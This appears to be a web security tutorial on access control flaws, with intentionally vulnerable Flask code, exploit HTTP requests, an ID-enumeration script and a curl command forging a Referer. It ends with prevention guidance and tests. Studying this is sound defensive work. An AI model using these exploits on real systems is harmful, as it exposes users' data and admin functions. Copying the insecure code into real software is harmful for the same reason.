# Access control vulnerabilities and privilege escalation

Access control vulnerabilities occur when applications fail to properly restrict what authenticated users can do or what resources they can access. These flaws enable attackers to view, modify, or delete data they shouldn't access, escalate from regular users to administrators, or perform actions beyond their authorized scope. Despite being conceptually simple, broken access control remains one of the most critical and common vulnerability classes because proper implementation requires consistent enforcement across every endpoint, function, and data object.

Access control sits at the intersection of authentication (who you are) and authorization (what you're allowed to do)—one confirms identity, the other enforces permissions.

> Only test systems you own or are explicitly authorized to assess.

## What is access control? (fundamentals)

### The three pillars of application security

**1) Authentication:** Proves user identity
```
User submits: username + password
System verifies: credentials match database
Result: User identity confirmed
```

**2) Session management:** Tracks authenticated users across requests
```
User logs in → Server issues session token
Subsequent requests include token
Server validates token → identifies user
```

**3) Access control (authorization):** Enforces what users can do
```
User requests: DELETE /api/users/123
System checks: Does this user have permission?
Result: Allow or deny the action
```

**All three must work together:**
- Authentication without access control = Everyone authenticated can do everything
- Session management without access control = Sessions tracked but permissions not enforced
- Access control without authentication = No way to identify who's making requests

### Types of access control

#### Vertical access control (privilege levels)
Different user types have different capabilities:
```
Administrator:
  - Create/delete users
  - Modify system settings
  - Access all data
  - View audit logs

Manager:
  - View team data
  - Approve requests
  - Generate reports

Employee:
  - View own data
  - Submit requests
  - Update own profile
```

#### Horizontal access control (same privilege, different data)
Users at same level can only access their own resources:
```
Customer A can access:
  - Their account (/account?id=123)
  - Their orders (/orders?user=123)
  - Their payment methods

Customer B can access:
  - Their account (/account?id=456)
  - Their orders (/orders?user=456)
  - Their payment methods

But Customer A CANNOT access Customer B's data (and vice versa)
```

#### Context-dependent access control (workflow state)
Access depends on application state or workflow position:
```
E-commerce workflow:
1. Add items to cart ✓ (allowed)
2. Proceed to checkout ✓ (allowed)
3. Enter payment ✓ (allowed)
4. Complete purchase ✓ (allowed)
5. Modify cart ✗ (not allowed - order finalized)

Document approval workflow:
Draft → Can edit
Submitted → Cannot edit, can only approve/reject
Approved → Read-only, cannot modify
```

## Vertical privilege escalation (accessing admin functions)

### Vulnerability 1: Unprotected admin functionality

**Scenario:** Admin pages accessible by URL but not linked for regular users.

**Vulnerable implementation:**
```python
# Admin page - NO authentication check!
@app.route('/admin')
def admin_panel():
    return render_template('admin.html')

@app.route('/admin/delete-user')
def delete_user():
    user_id = request.args.get('id')
    User.query.filter_by(id=user_id).delete()
    return "User deleted"
```

**User interface logic:**
```html
<!-- Regular user sees: -->
<nav>
  <a href="/dashboard">Dashboard</a>
  <a href="/profile">Profile</a>
</nav>

<!-- Admin user sees: -->
<nav>
  <a href="/dashboard">Dashboard</a>
  <a href="/profile">Profile</a>
  <a href="/admin">Admin Panel</a>  <!-- Only shown to admins -->
</nav>
```

**Problem:** Admin pages not shown in UI for regular users, but URL is still accessible!

**Exploitation:**
```http
GET /admin HTTP/1.1
Host: vulnerable.com
Cookie: session=regular_user_session

Response: 200 OK (Admin panel accessible!)
```

**Discovery via robots.txt:**
```
# https://example.com/robots.txt
User-agent: *
Disallow: /admin/
Disallow: /admin-panel/
Disallow: /administrator/
```

Attacker visits `/admin/` directly → gains admin access.

### Vulnerability 2: Security through obscurity

**Scenario:** Admin URL is "hidden" with unpredictable name.

**Vulnerable implementation:**
```python
# Admin at obscure URL
@app.route('/administrator-panel-yb556')
def secret_admin():
    return render_template('admin.html')
```

**JavaScript leak in client-side code:**
```javascript
// main.js - Loaded by ALL users
var isAdmin = false;

if (isAdmin) {
    var adminPanelTag = document.createElement('a');
    adminPanelTag.setAttribute('href', '/administrator-panel-yb556');
    adminPanelTag.innerText = 'Admin panel';
    document.body.appendChild(adminPanelTag);
}
```

**Exploitation:**
1. Regular user views page source
2. Finds JavaScript containing admin URL
3. Navigates directly to `/administrator-panel-yb556`
4. Gains admin access

**Other disclosure methods:**
```html
<!-- HTML comments -->
<!-- Admin panel: /admin-secret-xk9p2 -->

<!-- Disabled links -->
<a href="/admin-v2-secure" style="display:none">Admin</a>

<!-- Error messages -->
Error: Could not find /admin-xk9p2/users
```

### Vulnerability 3: Parameter-based access control

**Scenario:** User role stored in cookie or URL parameter.

**Vulnerable implementation (cookie-based):**
```python
@app.route('/admin')
def admin_panel():
    is_admin = request.cookies.get('admin')
    
    if is_admin == 'true':  # Trusting client-side value!
        return render_admin_panel()
    else:
        return "Access denied", 403
```

**Exploitation:**
```http
GET /admin HTTP/1.1
Host: vulnerable.com
Cookie: session=user123; admin=true

Response: 200 OK (Admin panel accessible!)
```

**Vulnerable implementation (URL parameter):**
```python
@app.route('/login')
def login():
    # After successful authentication
    if user.is_admin:
        return redirect('/home?admin=true')
    else:
        return redirect('/home?admin=false')

@app.route('/admin')
def admin():
    is_admin = request.args.get('admin')
    if is_admin == 'true':
        return render_admin_panel()
```

**Exploitation:**
```http
GET /admin?admin=true HTTP/1.1

Response: 200 OK (Instant admin access!)
```

### Vulnerability 4: Role stored in modifiable profile

**Scenario:** User role in editable profile field.

**Vulnerable flow:**
```python
@app.route('/profile/update', methods=['POST'])
def update_profile():
    user_id = session['user_id']
    email = request.json.get('email')
    roleid = request.json.get('roleid')  # Should not be user-editable!
    
    user = User.query.get(user_id)
    user.email = email
    user.roleid = roleid  # Oops! User can change their own role
    db.session.commit()
    
    return "Profile updated"
```

**Exploitation:**
```http
POST /profile/update HTTP/1.1
Content-Type: application/json

{
  "email": "attacker@evil.com",
  "roleid": 2
}

# roleid 1 = regular user
# roleid 2 = administrator
```

After update, attacker has admin privileges.

### Vulnerability 5: Platform misconfiguration bypasses

#### Bypass 1: URL override headers

**Vulnerable configuration:**
```
# Access control rule
DENY POST /admin/deleteUser for non-admins
```

**Bypass with X-Original-URL:**
```http
POST / HTTP/1.1
Host: vulnerable.com
X-Original-URL: /admin/deleteUser

user_id=123

# Access control checks "/" (allowed)
# Application routes to "/admin/deleteUser" (restricted function executed!)
```

**Alternative headers:**
```http
X-Original-URL: /admin/deleteUser
X-Rewrite-URL: /admin/deleteUser
X-Custom-IP-Authorization: 127.0.0.1
```

#### Bypass 2: HTTP method override

**Vulnerable configuration:**
```
# Access control rule
DENY POST /admin/deleteUser for non-admins
```

**If application accepts GET for same function:**
```http
# Blocked:
POST /admin/deleteUser HTTP/1.1
user_id=123

# Bypassed:
GET /admin/deleteUser?user_id=123 HTTP/1.1

# Also try:
DELETE /admin/deleteUser HTTP/1.1
PUT /admin/deleteUser HTTP/1.1
```

**Method override headers:**
```http
POST /admin/deleteUser HTTP/1.1
X-HTTP-Method-Override: GET
user_id=123
```

#### Bypass 3: URL-matching discrepancies

**Case sensitivity:**
```http
# Blocked:
GET /admin/deleteUser HTTP/1.1

# Bypassed:
GET /ADMIN/DELETEUSER HTTP/1.1
GET /Admin/DeleteUser HTTP/1.1
GET /admin/DELETEuser HTTP/1.1
```

**Trailing slash:**
```http
# Blocked:
GET /admin/deleteUser HTTP/1.1

# Bypassed:
GET /admin/deleteUser/ HTTP/1.1
```

**Spring Framework suffix pattern (pre-5.3):**
```http
# Blocked:
GET /admin/deleteUser HTTP/1.1

# Bypassed:
GET /admin/deleteUser.anything HTTP/1.1
GET /admin/deleteUser.php HTTP/1.1
GET /admin/deleteUser.jsp HTTP/1.1
```

## Horizontal privilege escalation (accessing other users' data)

### Vulnerability 1: Basic IDOR (Insecure Direct Object Reference)

**Scenario:** User ID in URL allows direct access to resources.

**Vulnerable implementation:**
```python
@app.route('/myaccount')
def my_account():
    user_id = request.args.get('id')
    
    # NO check if user_id matches logged-in user!
    user = User.query.get(user_id)
    
    return render_template('account.html', user=user)
```

**Normal usage:**
```http
GET /myaccount?id=123 HTTP/1.1
Cookie: session=user123_session

Response: Shows user 123's account (your account)
```

**Exploitation:**
```http
GET /myaccount?id=456 HTTP/1.1
Cookie: session=user123_session

Response: Shows user 456's account (someone else's!)
```

**Enumerate all users:**
```python
import requests

session = "user123_session"

for user_id in range(1, 1000):
    r = requests.get(
        f"https://target.com/myaccount?id={user_id}",
        cookies={"session": session}
    )
    
    if r.status_code == 200:
        print(f"User {user_id}: {extract_email(r.text)}")
```

### Vulnerability 2: IDOR with unpredictable IDs (GUID)

**Scenario:** User IDs are GUIDs, not sequential numbers.

**Vulnerable implementation:**
```python
@app.route('/user/<guid>')
def user_profile(guid):
    user = User.query.filter_by(guid=guid).first()
    
    # Still no authorization check!
    return render_template('profile.html', user=user)
```

**Challenge:** Can't guess GUIDs (e.g., `a1b2c3d4-e5f6-7890-abcd-ef1234567890`)

**But GUIDs leaked elsewhere:**
```html
<!-- Blog post comments -->
<div class="comment">
  <a href="/user/a1b2c3d4-e5f6-7890-abcd-ef1234567890">admin_user</a>
  said: "Great article!"
</div>

<div class="comment">
  <a href="/user/f9e8d7c6-b5a4-3210-9876-fedcba098765">ceo</a>
  said: "Thanks for sharing!"
</div>
```

**Exploitation:**
1. Browse site, collect GUIDs from comments, reviews, posts
2. Access each GUID: `/user/<collected_guid>`
3. View sensitive profile data for high-value users

### Vulnerability 3: Data leakage in redirect

**Scenario:** App redirects unauthorized access but response includes sensitive data.

**Vulnerable implementation:**
```python
@app.route('/myaccount')
def my_account():
    user_id = request.args.get('id')
    logged_in_user = session.get('user_id')
    
    user = User.query.get(user_id)
    
    # Check authorization AFTER fetching data
    if user_id != logged_in_user:
        response = make_response(redirect('/login'))
        response.set_cookie('error', 'Unauthorized access')
        # But data already rendered in response body!
        return response, 302
    
    return render_template('account.html', user=user)
```

**Exploitation:**
```http
GET /myaccount?id=456 HTTP/1.1
Cookie: session=user123_session

Response: 302 Redirect
Location: /login
Set-Cookie: error=Unauthorized access

<html>
<body>
  <!-- Sensitive data visible in response body before redirect! -->
  <h1>Account: admin@company.com</h1>
  <p>API Key: sk_live_4eC39HqLyjWDarjtT1zdp7dc</p>
  <p>Balance: $50,000</p>
</body>
</html>
```

**Browser redirects** but attacker intercepts full response with Burp Suite → sees sensitive data.

### Vulnerability 4: IDOR in API endpoints

**Scenario:** Web UI has proper access control, but API doesn't.

**Web UI (secure):**
```python
@app.route('/dashboard')
@login_required
def dashboard():
    user = current_user  # From session
    orders = Order.query.filter_by(user_id=user.id).all()
    return render_template('dashboard.html', orders=orders)
```

**API endpoint (insecure):**
```python
@app.route('/api/orders')
def api_orders():
    user_id = request.args.get('user_id')  # From parameter!
    
    # No authorization check!
    orders = Order.query.filter_by(user_id=user_id).all()
    
    return jsonify(orders)
```

**Exploitation:**
```http
GET /api/orders?user_id=456 HTTP/1.1

Response: 200 OK
[
  {"order_id": 789, "total": 250.00, "items": [...]}
]
```

Access any user's orders via API despite UI protection.

## Horizontal to vertical privilege escalation

### Technique: IDOR → Password disclosure → Admin access

**Step 1: IDOR to access admin profile**
```http
GET /account?id=1 HTTP/1.1
Cookie: session=user123_session

Response:
<html>
  <h1>Admin Account</h1>
  <form action="/update-profile">
    <input name="email" value="admin@company.com">
    <input name="password" value="AdminPass123!">  <!-- Password visible! -->
  </form>
</html>
```

**Step 2: Use disclosed password to login as admin**
```http
POST /login HTTP/1.1

username=admin@company.com&password=AdminPass123!

Response: 302 Redirect to /admin-dashboard
```

**Step 3: Now have full admin privileges**

### Technique: IDOR → Password reset → Account takeover

**Step 1: Access admin's account page via IDOR**
```http
GET /account?id=1 HTTP/1.1

Response:
<form action="/reset-password">
  <input type="hidden" name="user_id" value="1">
  <input type="password" name="new_password">
  <button>Change Password</button>
</form>
```

**Step 2: Submit password reset for admin**
```http
POST /reset-password HTTP/1.1

user_id=1&new_password=NewPass123!

Response: Password updated successfully
```

**Step 3: Login as admin with new password**

## Multi-step process vulnerabilities

### Scenario: Flawed workflow enforcement

**Intended workflow (admin updating user):**
```
Step 1: GET  /admin/update-user?user_id=123  (load form)
Step 2: POST /admin/update-user-confirm       (submit changes)
Step 3: POST /admin/update-user-finalize      (confirm changes)
```

**Access control:**
```python
# Step 1 - Protected
@app.route('/admin/update-user')
@require_admin
def load_form():
    return render_form()

# Step 2 - Protected
@app.route('/admin/update-user-confirm', methods=['POST'])
@require_admin
def confirm_changes():
    return render_confirmation()

# Step 3 - NOT Protected!
@app.route('/admin/update-user-finalize', methods=['POST'])
def finalize_changes():
    # Assumes user already passed steps 1 and 2
    user_id = request.form['user_id']
    new_role = request.form['role']
    
    user = User.query.get(user_id)
    user.role = new_role
    db.session.commit()
```

**Exploitation (skip steps 1 and 2):**
```http
POST /admin/update-user-finalize HTTP/1.1
Cookie: session=regular_user_session

user_id=999&role=administrator

Response: Changes saved successfully
```

Regular user escalates directly to admin by skipping protected steps.

## Referer-based access control

### Vulnerability: Trusting Referer header

**Vulnerable implementation:**
```python
@app.route('/admin')
@require_admin
def admin_panel():
    return render_template('admin.html')

@app.route('/admin/deleteUser')
def delete_user():
    referer = request.headers.get('Referer')
    
    # Only checks if request came from /admin page
    if referer and '/admin' in referer:
        user_id = request.args.get('id')
        User.query.filter_by(id=user_id).delete()
        return "User deleted"
    else:
        return "Access denied", 403
```

**Exploitation (forge Referer header):**
```http
GET /admin/deleteUser?id=123 HTTP/1.1
Host: vulnerable.com
Cookie: session=regular_user_session
Referer: https://vulnerable.com/admin

Response: User deleted
```

**Automated with curl:**
```bash
curl https://vulnerable.com/admin/deleteUser?id=123 \
  -H "Referer: https://vulnerable.com/admin" \
  -b "session=regular_user_session"
```

Regular user can perform admin actions by forging Referer.

## Real-world exploitation examples

### Example 1: Facebook IDOR (historical)

**Vulnerability:** Delete any photo via graph API

**Normal usage:**
```http
DELETE /v1.0/photos/12345 HTTP/1.1
Authorization: Bearer user_token

# Deletes your own photo
```

**Exploitation:**
```http
DELETE /v1.0/photos/67890 HTTP/1.1
Authorization: Bearer user_token

# Deletes someone else's photo!
```

No check if photo 67890 belonged to authenticated user.

### Example 2: PayPal account takeover

**Vulnerability:** Change email for any account

**Exploitation:**
```http
POST /myaccount/settings/email HTTP/1.1

account_id=victim@paypal.com&new_email=attacker@evil.com
```

No validation that `account_id` matched logged-in user.

### Example 3: Uber trip history access

**Vulnerability:** View any rider's trip history

**Normal:**
```http
GET /api/trips?user_id=USER123 HTTP/1.1
Authorization: Bearer USER123_token

# Returns USER123's trips
```

**Exploitation:**
```http
GET /api/trips?user_id=VICTIM456 HTTP/1.1
Authorization: Bearer USER123_token

# Returns VICTIM456's trips (addresses, names, times)
```

### Example 4: Admin password in HTML

**Discovery:**
```http
GET /admin/settings HTTP/1.1
Cookie: session=regular_user_session

Response: 403 Forbidden
```

**Try IDOR:**
```http
GET /account?id=1 HTTP/1.1
Cookie: session=regular_user_session

Response: 200 OK
<input type="text" name="username" value="admin">
<input type="password" name="password" value="SecureAdmin2024!">
```

Password visible in value attribute → login as admin.

## Prevention strategies

### 1) Deny by default

**Bad - Allowlist specific denials:**
```python
def check_access(user, resource):
    # Deny only specific cases
    if resource == '/admin' and not user.is_admin:
        return False
    
    return True  # Allow everything else
```

**Good - Deny by default:**
```python
def check_access(user, resource):
    # Deny everything by default
    allowed_resources = get_user_permissions(user)
    
    if resource in allowed_resources:
        return True
    
    return False  # Deny if not explicitly allowed
```

### 2) Never use client-side values for authorization

**Bad:**
```python
is_admin = request.cookies.get('admin')
role = request.args.get('role')
user_id = request.form['user_id']
```

**Good:**
```python
# Get everything from server-side session
user_id = session['user_id']
is_admin = session['is_admin']
role = session['role']

# Or query database
user = get_user_from_session()
is_admin = user.is_admin
```

### 3) Implement centralized access control

**Bad - Scattered checks:**
```python
@app.route('/admin/users')
def admin_users():
    if not current_user.is_admin:
        return "Forbidden", 403
    # ...

@app.route('/admin/settings')
def admin_settings():
    if current_user.role != 'admin':
        return "Access denied", 403
    # ...
```

**Good - Centralized decorator:**
```python
def require_role(role):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            if not has_role(current_user, role):
                return "Access denied", 403
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.route('/admin/users')
@require_role('admin')
def admin_users():
    # Authorization handled centrally
    pass

@app.route('/admin/settings')
@require_role('admin')
def admin_settings():
    pass
```

### 4) Check authorization on every request

**Vulnerable:**
```python
@app.route('/view-document/<doc_id>')
def view_document(doc_id):
    document = Document.query.get(doc_id)
    return render_template('document.html', doc=document)
```

**Secure:**
```python
@app.route('/view-document/<doc_id>')
@login_required
def view_document(doc_id):
    document = Document.query.get(doc_id)
    
    # Check user owns or has permission for this specific document
    if not user_can_access_document(current_user, document):
        return "Access denied", 403
    
    return render_template('document.html', doc=document)

def user_can_access_document(user, document):
    # Check ownership
    if document.owner_id == user.id:
        return True
    
    # Check if document shared with user
    if document.id in user.shared_documents:
        return True
    
    # Check admin override
    if user.is_admin:
        return True
    
    return False
```

### 5) Use object-level permissions

**Database model with ownership:**
```python
class Document(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200))
    content = db.Column(db.Text)
    owner_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    
    # Relationship
    owner = db.relationship('User', backref='documents')
    
    def can_access(self, user):
        return self.owner_id == user.id or user.is_admin
    
    def can_modify(self, user):
        return self.owner_id == user.id
```

**Usage:**
```python
@app.route('/document/<int:doc_id>/edit', methods=['POST'])
@login_required
def edit_document(doc_id):
    document = Document.query.get_or_404(doc_id)
    
    # Object-level permission check
    if not document.can_modify(current_user):
        return "Access denied", 403
    
    document.content = request.form['content']
    db.session.commit()
    
    return "Document updated"
```

### 6) Audit and test access controls

**Automated testing:**

```python
def test_access_control():
    # Create test users
    admin = create_test_user(role='admin')
    user1 = create_test_user(role='user')
    user2 = create_test_user(role='user')
    
    # Test 1: User cannot access admin endpoints
    response = client.get('/admin', headers=auth_header(user1))
    assert response.status_code == 403
    
    # Test 2: User cannot access other user's data
    response = client.get(f'/account?id={user2.id}', 
                         headers=auth_header(user1))
    assert response.status_code == 403
    
    # Test 3: User can access own data
    response = client.get(f'/account?id={user1.id}',
                         headers=auth_header(user1))
    assert response.status_code == 200
    
    # Test 4: Admin can access admin endpoints
    response = client.get('/admin', headers=auth_header(admin))
    assert response.status_code == 200
```
